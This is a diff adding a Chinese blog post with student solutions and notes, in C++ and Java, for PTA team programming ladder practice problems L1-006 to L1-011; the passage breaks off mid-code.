@@ -141,6 +141,119 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/03/19/团体程序设计天梯赛-练习集/" >团体程序设计天梯赛-练习集</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-03-19  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>链接：<a href="https://pintia.cn/problem-sets/994805046380707840/problems/type/7" target="_blank" rel="noopener">团体程序设计天梯赛-练习集</a></p>
+<h2 id="L1-006-连续因子"><a href="#L1-006-连续因子" class="headerlink" title="L1-006 连续因子"></a>L1-006 连续因子</h2><h3 id="序列最长长度"><a href="#序列最长长度" class="headerlink" title="序列最长长度"></a>序列最长长度</h3><p>因为n的取值范围：</p>
+<p><img src="/2021/03/19/%E5%9B%A2%E4%BD%93%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E7%BB%83%E4%B9%A0%E9%9B%86/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319111256733.png" alt="image-20210319111256733"></p>
+<p>又因为最长序列为2×3×。。。n，也就是n的阶乘。</p>
+<p>计算n的最长序列</p>
+<p>发现13!&gt;n最大值，12!&lt;n的最大值，，，，又因为1不算，，，也就是2×3×…13也就是最长为12位。。。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">13</span> ; ++i) &#123;</span><br><span class="line">        ans *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pow2 = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pow2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;结果</span><br><span class="line">13!:6227020800</span><br><span class="line">n的最大值:2147483648</span><br></pre></td></tr></table></figure>
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举所有的</p>
+<ol>
+<li>首先长度最长为12，从12开始减（依次枚举所有长度len的乘积【从2开始，，，】）</li>
+<li>判断能否被n整除，如果可以的话，因为是从最大开始，这次就是最大值。</li>
+</ol>
+<h3 id="int取值范围"><a href="#int取值范围" class="headerlink" title="int取值范围"></a>int取值范围</h3><p>最大值：2^31-1</p>
+<p>所以本次，，，n可以取int，但是ans可能超过int最大值，所以需要long long</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span> = <span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">12</span>; len &gt;= <span class="number">1</span> ; --len) &#123;<span class="comment">//最大长度为12，依次暴力所有的的长度情况</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">2</span>; start &lt;= <span class="built_in">max</span>; ++start) &#123;</span><br><span class="line">            ans = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; start + len; ++i) &#123;</span><br><span class="line">                ans *= i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n % ans == <span class="number">0</span>)&#123;<span class="comment">//如果是合法的</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="built_in">endl</span>&lt;&lt;start;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = start+<span class="number">1</span>; j &lt; start+len; ++j) &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"*"</span>&lt;&lt;j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//如果是质数，，，因为最大也只是sqrt(n)，所以上面出不来结果，，，就手动加上来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其实是比较简单的题，，，但是上次做的时候，没有时间，紧张，就没有认真看下去，结果，，，校赛就出了一道类似的，苦苦。</p>
+</blockquote>
+<h2 id="L1-007-念数字"><a href="#L1-007-念数字" class="headerlink" title="L1-007 念数字"></a>L1-007 念数字</h2><blockquote>
+<p>涉及字符串，，，使用java比较easy，，，</p>
+<p>主要就是用map来存储，输入直接用字符串，，，</p>
+</blockquote>
+<h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exercise;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ex_7</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character,String&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		hashmap.put(<span class="string">'0'</span>, <span class="string">"ling"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'1'</span>, <span class="string">"yi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'2'</span>, <span class="string">"er"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'3'</span>, <span class="string">"san"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'4'</span>, <span class="string">"si"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'5'</span>, <span class="string">"wu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'6'</span>, <span class="string">"liu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'7'</span>, <span class="string">"qi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'8'</span>, <span class="string">"ba"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'9'</span>, <span class="string">"jiu"</span>);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		String s  = scan.next();</span><br><span class="line">		<span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(hashmap.get(arr[<span class="number">0</span>]));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(hashmap.containsKey(arr[<span class="number">0</span>])) &#123;</span><br><span class="line">			System.out.print(hashmap.get(arr[<span class="number">0</span>])+<span class="string">" "</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.print(<span class="string">"fu "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		String ans=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(hashmap.containsKey(arr[i])) &#123;</span><br><span class="line">				ans += hashmap.get(arr[i])+<span class="string">" "</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = ans.substring(<span class="number">0</span>,ans.length()-<span class="number">1</span>);</span><br><span class="line">		System.out.println(ans);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h3><blockquote>
+<p>思路总体一样的</p>
+<p>但看起来更简洁，，，<del>如果会写的话，，，TAT</del></p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="built_in">string</span>&gt; mmap;</span><br><span class="line">    mmap[<span class="string">'-'</span>] = <span class="string">"fu"</span>;</span><br><span class="line">    mmap[<span class="string">'0'</span>] = <span class="string">"ling"</span>;</span><br><span class="line">    mmap[<span class="string">'1'</span>] = <span class="string">"yi"</span>;</span><br><span class="line">    mmap[<span class="string">'2'</span>] = <span class="string">"er"</span>;</span><br><span class="line">    mmap[<span class="string">'3'</span>] = <span class="string">"san"</span>;</span><br><span class="line">    mmap[<span class="string">'4'</span>] = <span class="string">"si"</span>;</span><br><span class="line">    mmap[<span class="string">'5'</span>] = <span class="string">"wu"</span>;</span><br><span class="line">    mmap[<span class="string">'6'</span>] = <span class="string">"liu"</span>;</span><br><span class="line">    mmap[<span class="string">'7'</span>] = <span class="string">"qi"</span>;</span><br><span class="line">    mmap[<span class="string">'8'</span>] = <span class="string">"ba"</span>;</span><br><span class="line">    mmap[<span class="string">'9'</span>] = <span class="string">"jiu"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s ;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; s.length()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;mmap[s[i]]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;mmap[s[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="L1-008-求整数段和"><a href="#L1-008-求整数段和" class="headerlink" title="L1-008 求整数段和"></a>L1-008 求整数段和</h2><blockquote>
+<p><del>easy</del></p>
+</blockquote>
+<h3 id="每个数字占5个字符宽度"><a href="#每个数字占5个字符宽度" class="headerlink" title="每个数字占5个字符宽度"></a>每个数字占5个字符宽度</h3><p>使用格式化字符串 =&gt; <del>快乐</del></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a,len=<span class="number">1</span>; i &lt;= b ; ++i,len++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br><span class="line">        sum += i;</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">5</span> ==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((b-a+<span class="number">1</span>)%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Sum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nSum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="L1-009-N个数求和"><a href="#L1-009-N个数求和" class="headerlink" title="L1-009 N个数求和"></a>L1-009 N个数求和</h2><blockquote>
+<p>首先计算分数加法公式：</p>
+<p>![img](file:///C:\Users\YCNN\Documents\Tencent Files\1187691781\Image\C2C\9CFF06029FD196D5E19F7D9FF8F6B771.png)</p>
+<p>然后计算结果分子分母的最大公约数，然后相除，得到最简分数</p>
+<p>这里需要考虑的地方：</p>
+<ol>
+<li>分母小于0 =&gt; 把符号换到分子上去</li>
+<li>分子小于0，说明为0，为了方便后期的计算，将分母置为0，防止该数的影响</li>
+</ol>
+<p>最后，根据能否整除，输出不同的结果。</p>
+</blockquote>
+<h3 id="scanf输入"><a href="#scanf输入" class="headerlink" title="scanf输入"></a>scanf输入</h3><p>这里使用scanf输入，，因为知道两个数字中间一定有一个/，可以简化，，，不用特意接受字符’/‘</p>
+<h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>固定格式：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beauty</span><span class="params">(<span class="keyword">int</span> &amp;a1,<span class="keyword">int</span> &amp;b1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        a1 = -a1;</span><br><span class="line">        b1 = -b1;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == <span class="number">0</span>)&#123;</span><br><span class="line">        b1 = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> simple = gcd(<span class="built_in">abs</span>(a1),<span class="built_in">abs</span>(b1));</span><br><span class="line">        a1 /= simple;</span><br><span class="line">        b1 /= simple;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> a1,b1,a2,b2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a1,&amp;b1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a2,&amp;b2);</span><br><span class="line">        a1 = a1 * b2 + a2 * b1;</span><br><span class="line">        b1 = b1 * b2;</span><br><span class="line">        beauty(a1,b1);</span><br><span class="line">    &#125;</span><br><span class="line">    beauty(a1,b1);<span class="comment">//如果只有一个式子，不会进入循环，，，但是输入可能不是最简的</span></span><br><span class="line">    <span class="keyword">if</span>(b1 == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 &lt; b1)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1/b1&lt;&lt;<span class="string">" "</span>&lt;&lt;a1 % b1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="L1-010-比较大小"><a href="#L1-010-比较大小" class="headerlink" title="L1-010 比较大小"></a>L1-010 比较大小</h2><blockquote>
+<p>只是对三个数排序，，，非常简单</p>
+</blockquote>
+<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>头文件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr,arr+<span class="number">3</span>);<span class="comment">//arr是数组名，3是arr的长度</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>]&gt;&gt;arr[<span class="number">1</span>]&gt;&gt;arr[<span class="number">2</span>];</span><br><span class="line">    sort(arr,arr+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">1</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="L1-011-A-B"><a href="#L1-011-A-B" class="headerlink" title="L1-011 A-B"></a>L1-011 A-B</h2><blockquote>
+<p><del>本来是用eclipse的replace做的，但是超时了，，，555</del></p>
+<p><img src="/2021/03/19/%E5%9B%A2%E4%BD%93%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E7%BB%83%E4%B9%A0%E9%9B%86/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319201138492.png" alt="image-20210319201138492"></p>
+<p>正确的思路：</p>
+<p>遍历第二个字符串，用长度为256（ascii表长度）的数组记录又那些出现过的字符，最后再对第一个字符串遍历，根据数组是否出现过，，，。这里数组的存储的index就是字符串的ascii码【这点比较interesting】</p>
+</blockquote>
+<h3 id="c-输入一行"><a href="#c-输入一行" class="headerlink" title="c++输入一行"></a>c++输入一行</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getline(<span class="built_in">cin</span>,a);</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> mark[<span class="number">256</span>];</span><br><span 